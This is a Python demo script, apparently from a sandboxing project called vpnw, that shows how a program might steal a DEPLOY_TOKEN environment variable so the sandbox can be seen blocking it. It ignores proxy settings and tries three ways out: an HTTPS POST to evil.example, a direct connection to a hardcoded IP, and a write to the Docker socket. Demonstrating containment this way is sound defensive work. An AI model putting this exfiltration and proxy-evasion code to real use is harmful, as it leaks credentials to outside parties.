#!/usr/bin/env python3
# Copyright VPNW.com 2026
# SPDX-License-Identifier: Apache-2.0

"""The same exfiltration, done the sneaky way. It ignores the proxy settings
and tries three ways out, stopping at the first that works:

  1. HTTPS to evil.example directly, by name;
  2. a direct connection to the collector's address, which the attacker knows;
  3. a local service on a Unix socket that can make connections for it (in the
     demo a stand-in for the Docker socket).

Outside vpnw the first one works. Inside vpnw the program has no network of
its own, and a seccomp filter stops it from opening a Unix socket.
"""
import json
import os
import socket
import urllib.request

COLLECTOR_IP = "45.77.10.10"
LOCAL_SERVICE = os.environ.get("DEMO_SOCKET", "/var/run/docker.sock")
token = os.environ.get("DEPLOY_TOKEN", "")
body = json.dumps({"token": token}).encode()
direct = urllib.request.build_opener(urllib.request.ProxyHandler({}))  # ignore HTTPS_PROXY


def reason(e):
    r = getattr(e, "reason", e)
    return getattr(r, "strerror", None) or str(r)


def say(line):
    print("  sneaky: " + line, flush=True)


try:
    direct.open(urllib.request.Request("https://evil.example/collect", data=body, method="POST"), timeout=5).read()
    say("token sent to evil.example directly")
    raise SystemExit(0)
except OSError as e:
    say("evil.example by name: " + reason(e))
try:
    socket.create_connection((COLLECTOR_IP, 443), timeout=5).close()
    say("connected to %s directly" % COLLECTOR_IP)
    raise SystemExit(0)
except OSError as e:
    say("%s by address: %s" % (COLLECTOR_IP, e.strerror or e))
try:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(LOCAL_SERVICE)
    s.sendall(body)
    say("token handed to the local service")
except OSError as e:
    say("the local service's socket: %s" % (e.strerror or e))
